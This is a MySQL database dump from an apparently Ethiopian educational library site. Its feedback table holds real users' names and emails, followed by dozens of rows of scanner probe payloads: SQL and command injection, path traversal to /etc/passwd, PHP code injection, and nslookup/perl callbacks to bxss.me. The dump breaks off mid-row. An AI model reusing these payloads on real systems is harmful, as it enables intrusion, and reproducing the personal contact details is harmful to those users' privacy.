-- MySQL dump 10.13  Distrib 8.0.29, for macos12.2 (x86_64)
--
-- Host: localhost    Database: storage
-- ------------------------------------------------------
-- Server version	8.0.29

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `courses`
--

DROP TABLE IF EXISTS `courses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `courses` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `grade_id` int unsigned DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=126 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `courses`
--

LOCK TABLES `courses` WRITE;
/*!40000 ALTER TABLE `courses` DISABLE KEYS */;
/*!40000 ALTER TABLE `courses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `failed_jobs`
--

DROP TABLE IF EXISTS `failed_jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `failed_jobs` (
  `id` bigint unsigned NOT NULL,
  `uuid` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `connection` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `queue` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `payload` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `exception` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `failed_jobs`
--

LOCK TABLES `failed_jobs` WRITE;
/*!40000 ALTER TABLE `failed_jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `failed_jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `feedback`
--

DROP TABLE IF EXISTS `feedback`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `feedback` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `feedbackType` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `firstname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `lastname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=379 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `feedback`
--

LOCK TABLES `feedback` WRITE;
/*!40000 ALTER TABLE `feedback` DISABLE KEYS */;
INSERT INTO `feedback` VALUES (3,'Suggestion','Its good to have website like this!','Alemhulu','Awekelgne','alemhulu@gmail.com','2021-03-15 11:47:42','2021-03-15 11:47:42'),(4,'Suggestions','Keep hard work on it','Maty','Arega','Matyarega@gmail.com','2021-03-20 18:32:38','2021-03-20 18:32:38'),(5,'Comments','Excellent site!','A','A','d@d.com','2021-03-30 16:03:17','2021-03-30 16:03:17'),(6,'Question','why does this site exclude lower grades? I think as a national institute it should include all the curriculum in this country.','Muluken Aweke','Alebel','muller.aweke@gmail.com','2021-04-06 04:33:40','2021-04-06 04:33:40'),(7,'Question','why does this site exclude lower grades? I think as a national institute it should include all the curriculum in this country.','Muluken Aweke','Alebel','muller.aweke@gmail.com','2021-04-06 04:33:48','2021-04-06 04:33:48'),(8,'Suggestions','260735','Abiib','Sacad','260735','2021-04-09 17:16:56','2021-04-09 17:16:56'),(9,'Question','Hello, Could I get an email contact for the person Managing the Digital Library','Peter','Mugo','peter@snapplify.com','2021-04-12 07:30:00','2021-04-12 07:30:00'),(10,'Question','Hello, Could I get an email contact for the person Managing the Digital Library','Peter','Mugo','peter@snapplify.com','2021-04-12 07:30:07','2021-04-12 07:30:07'),(11,'Comments','very good','slenat','dejen','slenatdejen268@gmail.com','2021-04-20 10:06:12','2021-04-20 10:06:12'),(12,'Comments','very good','slenat','dejen','slenatdejen268@gmail.com','2021-04-20 10:06:44','2021-04-20 10:06:44'),(13,'Suggestions','Ethiopian Grade 12 Economics Student Textbook','robelp','pop','robelpop@gmial.com','2021-04-22 15:44:39','2021-04-22 15:44:39'),(14,'Comments','Ethiopian Grade 12 Economics Student Textbook','robelp','pop','robelpop@gmial.com','2021-04-22 15:44:47','2021-04-22 15:44:47'),(15,'Question','Ethiopian Grade 12 Economics Student Textbook','robelp','pop','robelpop@gmial.com','2021-04-22 15:44:50','2021-04-22 15:44:50'),(16,'Comments','wow i didn\'t know i can download the books and the videos.\r\ni liked it???????❤❤❤❤❤','kidus','yetnayet','kidusyetnayet16@gmail.com','2021-04-24 10:23:31','2021-04-24 10:23:31'),(17,'Comments','wow i didn\'t know i can download the books and the videos.\r\ni liked it???????❤❤❤❤❤','kidus','yetnayet','kidusyetnayet16@gmail.com','2021-04-24 10:23:45','2021-04-24 10:23:45'),(18,'Comments','wow i didn\'t know i can download the books and the videos.\r\ni liked it???????❤❤❤❤❤','kidus','yetnayet','kidusyetnayet16@gmail.com','2021-04-24 10:23:50','2021-04-24 10:23:50'),(19,'Comments','wow i didn\'t know i can download the books and the videos.\r\ni liked it???????❤❤❤❤❤','kidus','yetnayet','kidusyetnayet28@gmail.com','2021-04-24 10:35:04','2021-04-24 10:35:04'),(20,'Comments','wow i didn\'t know i can download the books and the videos.\r\ni liked it???????❤❤❤❤❤','kidus','yetnayet','kidusyetnayet28@gmail.com','2021-04-24 10:35:09','2021-04-24 10:35:09'),(21,'Suggestions','Hi i would like to suggest you to make the website a secure connection (https) , work on the gui because  it looks like a website from 2010gc and work on a faster connection because its slow and it can be easily hit off','Brook','Temesgen','brooktemesgen68@gmail.com','2021-05-17 17:23:18','2021-05-17 17:23:18'),(22,'Comments','This is good','yadu','guluma','yadu.guluma@gmail.com','2021-05-19 05:26:48','2021-05-19 05:26:48'),(23,'Suggestions','Grede 9','Biruk','Abeb','birukbir486@gmail.com','2021-05-19 13:50:55','2021-05-19 13:50:55'),(24,'Comments','I love the site more of interesting stuff i got thanks a lot','Biniam','Admasu','Biniamadmasu@gmail.com','2021-05-23 06:18:06','2021-05-23 06:18:06'),(25,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:40:18','2021-06-14 17:40:18'),(26,'Question','1\'\"','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:20','2021-06-14 17:44:20'),(27,'Question','\\','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:21','2021-06-14 17:44:21'),(28,'Question','@@FhayB','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:22','2021-06-14 17:44:22'),(29,'Question','JyI=','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:23','2021-06-14 17:44:23'),(30,'Question','1','HfjNUlYZ','HfjNUlYZ','1\'\"','2021-06-14 17:44:25','2021-06-14 17:44:25'),(31,'Question','1','HfjNUlYZ','HfjNUlYZ','\\','2021-06-14 17:44:25','2021-06-14 17:44:25'),(32,'Question','1','HfjNUlYZ','HfjNUlYZ','@@DfRh8','2021-06-14 17:44:27','2021-06-14 17:44:27'),(33,'Question','1','HfjNUlYZ','HfjNUlYZ','JyI=','2021-06-14 17:44:28','2021-06-14 17:44:28'),(34,'1\'\"','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:31','2021-06-14 17:44:31'),(35,'\\','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:31','2021-06-14 17:44:31'),(36,'@@z0Mue','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:33','2021-06-14 17:44:33'),(37,'JyI=','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:34','2021-06-14 17:44:34'),(38,'Question','1','1\'\"','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:36','2021-06-14 17:44:36'),(39,'Question','1','\\','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:37','2021-06-14 17:44:37'),(40,'Question','1','@@2Zy6T','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:38','2021-06-14 17:44:38'),(41,'Question','1','JyI=','HfjNUlYZ','sample@email.tst','2021-06-14 17:44:39','2021-06-14 17:44:39'),(42,'Question','1','HfjNUlYZ','1\'\"','sample@email.tst','2021-06-14 17:44:41','2021-06-14 17:44:41'),(43,'Question','1','HfjNUlYZ','\\','sample@email.tst','2021-06-14 17:44:42','2021-06-14 17:44:42'),(44,'Question','1','HfjNUlYZ','@@dyoUk','sample@email.tst','2021-06-14 17:44:43','2021-06-14 17:44:43'),(45,'Question','1','HfjNUlYZ','JyI=','sample@email.tst','2021-06-14 17:44:44','2021-06-14 17:44:44'),(46,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:02','2021-06-14 17:45:02'),(47,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:04','2021-06-14 17:45:04'),(48,'Question','${9999168+9999406}','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:07','2021-06-14 17:45:07'),(49,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:07','2021-06-14 17:45:07'),(50,'Question','1','HfjNUlYZ','HfjNUlYZ','${9999026+9999869}','2021-06-14 17:45:07','2021-06-14 17:45:07'),(51,'Question','HttP://bxss.me/t/xss.html?%00','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:07','2021-06-14 17:45:07'),(52,'${10000412+10000106}','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:08','2021-06-14 17:45:08'),(53,'Question','bxss.me/t/xss.html?%00','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:08','2021-06-14 17:45:08'),(54,'Question','1','${9999491+9999090}','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:08','2021-06-14 17:45:08'),(55,'Question','1','HfjNUlYZ','HfjNUlYZ','HttP://bxss.me/t/xss.html?%00','2021-06-14 17:45:08','2021-06-14 17:45:08'),(56,'Question','1','HfjNUlYZ','${9999091+9999248}','sample@email.tst','2021-06-14 17:45:09','2021-06-14 17:45:09'),(57,'Question','../../../../../../../../../../etc/passwd','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:09','2021-06-14 17:45:09'),(58,'Question','1','HfjNUlYZ','HfjNUlYZ','bxss.me/t/xss.html?%00','2021-06-14 17:45:09','2021-06-14 17:45:09'),(59,'Question','../../../../../../../../../../windows/win.ini','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:09','2021-06-14 17:45:09'),(60,'HttP://bxss.me/t/xss.html?%00','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:09','2021-06-14 17:45:09'),(61,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:10','2021-06-14 17:45:10'),(62,'bxss.me/t/xss.html?%00','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:10','2021-06-14 17:45:10'),(63,'Question','../1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:10','2021-06-14 17:45:10'),(64,'Question','1','HttP://bxss.me/t/xss.html?%00','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:10','2021-06-14 17:45:10'),(65,'Question','1','HfjNUlYZ','HfjNUlYZ','../../../../../../../../../../etc/passwd','2021-06-14 17:45:11','2021-06-14 17:45:11'),(66,'Question','1','bxss.me/t/xss.html?%00','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:11','2021-06-14 17:45:11'),(67,'Question','1','HfjNUlYZ','HfjNUlYZ','../../../../../../../../../../windows/win.ini','2021-06-14 17:45:11','2021-06-14 17:45:11'),(68,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:11','2021-06-14 17:45:11'),(69,'Question','1','HfjNUlYZ','HttP://bxss.me/t/xss.html?%00','sample@email.tst','2021-06-14 17:45:12','2021-06-14 17:45:12'),(70,'Question','1','HfjNUlYZ','HfjNUlYZ','../sample@email.tst','2021-06-14 17:45:12','2021-06-14 17:45:12'),(71,'Question',';print(md5(31337));','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:12','2021-06-14 17:45:12'),(72,'Question','1','HfjNUlYZ','bxss.me/t/xss.html?%00','sample@email.tst','2021-06-14 17:45:12','2021-06-14 17:45:12'),(73,'../../../../../../../../../../etc/passwd','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:12','2021-06-14 17:45:12'),(74,'Question','\';print(md5(31337));$a=\'','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:12','2021-06-14 17:45:12'),(75,'../../../../../../../../../../windows/win.ini','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:13','2021-06-14 17:45:13'),(76,'Question','\";print(md5(31337));$a=\"','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:13','2021-06-14 17:45:13'),(77,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:13','2021-06-14 17:45:13'),(78,'Question','${@print(md5(31337))}','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:13','2021-06-14 17:45:13'),(79,'../Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:14','2021-06-14 17:45:14'),(80,'Question','${@print(md5(31337))}\\','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:14','2021-06-14 17:45:14'),(81,'Question','1','../../../../../../../../../../etc/passwd','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:14','2021-06-14 17:45:14'),(82,'Question',')','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:14','2021-06-14 17:45:14'),(83,'Question','\'.print(md5(31337)).\'','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:14','2021-06-14 17:45:14'),(84,'Question','1','../../../../../../../../../../windows/win.ini','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:14','2021-06-14 17:45:14'),(85,'Question','1','HfjNUlYZ','HfjNUlYZ',';print(md5(31337));','2021-06-14 17:45:15','2021-06-14 17:45:15'),(86,'Question','!(()&&!|*|*|','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:15','2021-06-14 17:45:15'),(87,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:15','2021-06-14 17:45:15'),(88,'Question','1','HfjNUlYZ','HfjNUlYZ','\';print(md5(31337));$a=\'','2021-06-14 17:45:15','2021-06-14 17:45:15'),(89,'Question','^(#$!@#$)(()))******','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:15','2021-06-14 17:45:15'),(90,'Question','1','../HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:15','2021-06-14 17:45:15'),(91,'Question','1','HfjNUlYZ','HfjNUlYZ','\";print(md5(31337));$a=\"','2021-06-14 17:45:16','2021-06-14 17:45:16'),(92,'Question','1','HfjNUlYZ','../../../../../../../../../../etc/passwd','sample@email.tst','2021-06-14 17:45:16','2021-06-14 17:45:16'),(93,'Question','1','HfjNUlYZ','HfjNUlYZ',')','2021-06-14 17:45:16','2021-06-14 17:45:16'),(94,'Question','1','HfjNUlYZ','HfjNUlYZ','${@print(md5(31337))}','2021-06-14 17:45:16','2021-06-14 17:45:16'),(95,'Question','1','HfjNUlYZ','../../../../../../../../../../windows/win.ini','sample@email.tst','2021-06-14 17:45:16','2021-06-14 17:45:16'),(96,'Question','1','HfjNUlYZ','HfjNUlYZ','!(()&&!|*|*|','2021-06-14 17:45:16','2021-06-14 17:45:16'),(97,'Question','1','HfjNUlYZ','HfjNUlYZ','${@print(md5(31337))}\\','2021-06-14 17:45:17','2021-06-14 17:45:17'),(98,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:17','2021-06-14 17:45:17'),(99,'Question','1','HfjNUlYZ','HfjNUlYZ','^(#$!@#$)(()))******','2021-06-14 17:45:17','2021-06-14 17:45:17'),(100,'Question','1','HfjNUlYZ','HfjNUlYZ','\'.print(md5(31337)).\'','2021-06-14 17:45:17','2021-06-14 17:45:17'),(101,'Question','1','HfjNUlYZ','../HfjNUlYZ','sample@email.tst','2021-06-14 17:45:17','2021-06-14 17:45:17'),(102,')','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:17','2021-06-14 17:45:17'),(103,';print(md5(31337));','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:18','2021-06-14 17:45:18'),(104,'\';print(md5(31337));$a=\'','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:18','2021-06-14 17:45:18'),(105,'!(()&&!|*|*|','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:18','2021-06-14 17:45:18'),(106,'\";print(md5(31337));$a=\"','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:18','2021-06-14 17:45:18'),(107,'^(#$!@#$)(()))******','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:19','2021-06-14 17:45:19'),(108,'${@print(md5(31337))}','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:19','2021-06-14 17:45:19'),(109,'Question','1',')','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:19','2021-06-14 17:45:19'),(110,'${@print(md5(31337))}\\','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:19','2021-06-14 17:45:19'),(111,'Question','1','!(()&&!|*|*|','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:20','2021-06-14 17:45:20'),(112,'\'.print(md5(31337)).\'','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:20','2021-06-14 17:45:20'),(113,'Question','echo xqdxtw$()\\ nxmzvl\\nz^xyu||a #\' &echo xqdxtw$()\\ nxmzvl\\nz^xyu||a #|\" &echo xqdxtw$()\\ nxmzvl\\nz^xyu||a #','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:20','2021-06-14 17:45:20'),(114,'Question','http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:20','2021-06-14 17:45:20'),(115,'Question','1','^(#$!@#$)(()))******','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:20','2021-06-14 17:45:20'),(116,'Question','1',';print(md5(31337));','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:20','2021-06-14 17:45:20'),(117,'Question','&echo ehhfqj$()\\ pvmkro\\nz^xyu||a #\' &echo ehhfqj$()\\ pvmkro\\nz^xyu||a #|\" &echo ehhfqj$()\\ pvmkro\\nz^xyu||a #','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(118,'Question','1','HfjNUlYZ',')','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(119,'Question','1some_inexistent_file_with_long_name\0.jpg','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(120,'Question','1','\';print(md5(31337));$a=\'','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(121,'Question','|echo spgavy$()\\ nupeeu\\nz^xyu||a #\' |echo spgavy$()\\ nupeeu\\nz^xyu||a #|\" |echo spgavy$()\\ nupeeu\\nz^xyu||a #','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(122,'Question','1','HfjNUlYZ','!(()&&!|*|*|','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(123,'Question','Http://bxss.me/t/fit.txt','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(124,'Question','1','\";print(md5(31337));$a=\"','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:21','2021-06-14 17:45:21'),(125,'Question','(nslookup hitqubpxwtiwh12a61.bxss.me||perl -e \"gethostbyname(\'hitqubpxwtiwh12a61.bxss.me\')\")','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:22','2021-06-14 17:45:22'),(126,'Question','1','HfjNUlYZ','^(#$!@#$)(()))******','sample@email.tst','2021-06-14 17:45:22','2021-06-14 17:45:22'),(127,'Question','http://bxss.me/t/fit.txt?.jpg','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:22','2021-06-14 17:45:22'),(128,'Question','1','${@print(md5(31337))}','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:22','2021-06-14 17:45:22'),(129,'Question','$(nslookup hittxvatpmkznd7954.bxss.me||perl -e \"gethostbyname(\'hittxvatpmkznd7954.bxss.me\')\")','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:22','2021-06-14 17:45:22'),(130,'Question','1','${@print(md5(31337))}\\','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:22','2021-06-14 17:45:22'),(131,'Question','bxss.me','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:22','2021-06-14 17:45:22'),(132,'Question','&(nslookup hitzqgakonhnjb3107.bxss.me||perl -e \"gethostbyname(\'hitzqgakonhnjb3107.bxss.me\')\")&\'\\\"`0&(nslookup hitzqgakonhnjb3107.bxss.me||perl -e \"gethostbyname(\'hitzqgakonhnjb3107.bxss.me\')\")&`\'','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:23','2021-06-14 17:45:23'),(133,'Question','1','\'.print(md5(31337)).\'','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:23','2021-06-14 17:45:23'),(134,'Question','1','HfjNUlYZ','HfjNUlYZ','http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.tst','2021-06-14 17:45:23','2021-06-14 17:45:23'),(135,'Question','1','HfjNUlYZ',';print(md5(31337));','sample@email.tst','2021-06-14 17:45:23','2021-06-14 17:45:23'),(136,'Question','|(nslookup hitbxehquzvsda90c5.bxss.me||perl -e \"gethostbyname(\'hitbxehquzvsda90c5.bxss.me\')\")','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:23','2021-06-14 17:45:23'),(137,'Question','1','HfjNUlYZ','HfjNUlYZ','1some_inexistent_file_with_long_name\0.tst','2021-06-14 17:45:23','2021-06-14 17:45:23'),(138,'Question','1','HfjNUlYZ','\';print(md5(31337));$a=\'','sample@email.tst','2021-06-14 17:45:24','2021-06-14 17:45:24'),(139,'Question','`(nslookup hitziwyiivgnd9b334.bxss.me||perl -e \"gethostbyname(\'hitziwyiivgnd9b334.bxss.me\')\")`','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:24','2021-06-14 17:45:24'),(140,'Question','1','HfjNUlYZ','HfjNUlYZ','Http://bxss.me/t/fit.txt','2021-06-14 17:45:24','2021-06-14 17:45:24'),(141,'Question','1','HfjNUlYZ','\";print(md5(31337));$a=\"','sample@email.tst','2021-06-14 17:45:24','2021-06-14 17:45:24'),(142,'Question','1','HfjNUlYZ','HfjNUlYZ','http://bxss.me/t/fit.txt?.tst','2021-06-14 17:45:25','2021-06-14 17:45:25'),(143,'Question','1','HfjNUlYZ','${@print(md5(31337))}','sample@email.tst','2021-06-14 17:45:25','2021-06-14 17:45:25'),(144,'Question','1','HfjNUlYZ','HfjNUlYZ','echo wugixu$()\\ xdbtnf\\nz^xyu||a #\' &echo wugixu$()\\ xdbtnf\\nz^xyu||a #|\" &echo wugixu$()\\ xdbtnf\\nz^xyu||a #','2021-06-14 17:45:25','2021-06-14 17:45:25'),(145,'Question','1','HfjNUlYZ','${@print(md5(31337))}\\','sample@email.tst','2021-06-14 17:45:25','2021-06-14 17:45:25'),(146,'Question','1','HfjNUlYZ','HfjNUlYZ','bxss.me','2021-06-14 17:45:25','2021-06-14 17:45:25'),(147,'Question','1','HfjNUlYZ','HfjNUlYZ','&echo zpfunj$()\\ ovsvsv\\nz^xyu||a #\' &echo zpfunj$()\\ ovsvsv\\nz^xyu||a #|\" &echo zpfunj$()\\ ovsvsv\\nz^xyu||a #','2021-06-14 17:45:25','2021-06-14 17:45:25'),(148,'Question','1','HfjNUlYZ','\'.print(md5(31337)).\'','sample@email.tst','2021-06-14 17:45:26','2021-06-14 17:45:26'),(149,'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:26','2021-06-14 17:45:26'),(150,'Question','1','HfjNUlYZ','HfjNUlYZ','|echo cexrwa$()\\ ftonjo\\nz^xyu||a #\' |echo cexrwa$()\\ ftonjo\\nz^xyu||a #|\" |echo cexrwa$()\\ ftonjo\\nz^xyu||a #','2021-06-14 17:45:26','2021-06-14 17:45:26'),(151,'1some_inexistent_file_with_long_name\0.jpg','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:26','2021-06-14 17:45:26'),(152,'Question','1','HfjNUlYZ','HfjNUlYZ','(nslookup hitnjcszqnwrwac12e.bxss.me||perl -e \"gethostbyname(\'hitnjcszqnwrwac12e.bxss.me\')\")','2021-06-14 17:45:27','2021-06-14 17:45:27'),(153,'Http://bxss.me/t/fit.txt','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:27','2021-06-14 17:45:27'),(154,'Question','1','HfjNUlYZ','HfjNUlYZ','$(nslookup hitgqosxjdagy5f537.bxss.me||perl -e \"gethostbyname(\'hitgqosxjdagy5f537.bxss.me\')\")','2021-06-14 17:45:27','2021-06-14 17:45:27'),(155,'http://bxss.me/t/fit.txt?.jpg','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:27','2021-06-14 17:45:27'),(156,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:28','2021-06-14 17:45:28'),(157,'Question','1','HfjNUlYZ','HfjNUlYZ','&(nslookup hitumguzsjelt81add.bxss.me||perl -e \"gethostbyname(\'hitumguzsjelt81add.bxss.me\')\")&\'\\\"`0&(nslookup hitumguzsjelt81add.bxss.me||perl -e \"gethostbyname(\'hitumguzsjelt81add.bxss.me\')\")&`\'','2021-06-14 17:45:28','2021-06-14 17:45:28'),(158,'bxss.me','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:28','2021-06-14 17:45:28'),(159,'Question','1','HfjNUlYZ','HfjNUlYZ','|(nslookup hitfgzafujcpf51c3b.bxss.me||perl -e \"gethostbyname(\'hitfgzafujcpf51c3b.bxss.me\')\")','2021-06-14 17:45:29','2021-06-14 17:45:29'),(160,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:29','2021-06-14 17:45:29'),(161,'Question','1','http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:29','2021-06-14 17:45:29'),(162,'Question','1','HfjNUlYZ','HfjNUlYZ','`(nslookup hitvehytuzswca444b.bxss.me||perl -e \"gethostbyname(\'hitvehytuzswca444b.bxss.me\')\")`','2021-06-14 17:45:29','2021-06-14 17:45:29'),(163,'Question','1','1some_inexistent_file_with_long_name\0.jpg','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:29','2021-06-14 17:45:29'),(164,'Question','-1 OR 2+566-566-1=0+0+0+1 